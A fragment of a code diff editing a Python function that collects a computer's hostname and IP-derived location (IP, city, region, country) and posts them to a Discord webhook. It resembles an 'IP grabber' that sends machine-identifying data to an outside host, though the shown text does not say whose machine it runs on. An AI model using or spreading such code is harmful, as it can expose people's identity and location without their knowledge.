@@ -18,22 +18,19 @@ def send_to_discord(webhook_url, ip_info):
 
     # Get the PC name (hostname)
     pc_name = platform.node()
+    print(f"PC Name: {pc_name}")  # Check if the hostname is fetched correctly
 
-    # Preparing data for Discord
+    # Preparing data for Discord with only the PC name as content to simplify testing
     data = {
         "content": f"PC Name: {pc_name}",  # Display the PC name here
         "embeds": [
             {
-                "title": f"{pc_name}'s IP Details",  # Title includes the PC name
-                "description": f"Here is the IP information for {pc_name}.",
+                "title": "IP Details",
                 "fields": [
                     {"name": "IP", "value": ip_info.get("ip", "N/A")},
                     {"name": "City", "value": ip_info.get("city", "N/A")},
                     {"name": "Region", "value": ip_info.get("region", "N/A")},
                     {"name": "Country", "value": ip_info.get("country", "N/A")},
-                    {"name": "Location", "value": ip_info.get("loc", "N/A")},
-                    {"name": "Org", "value": ip_info.get("org", "N/A")},
-                    {"name": "Timezone", "value": ip_info.get("timezone", "N/A")}
                 ],
                 "color": 16711680  # Red color
             }
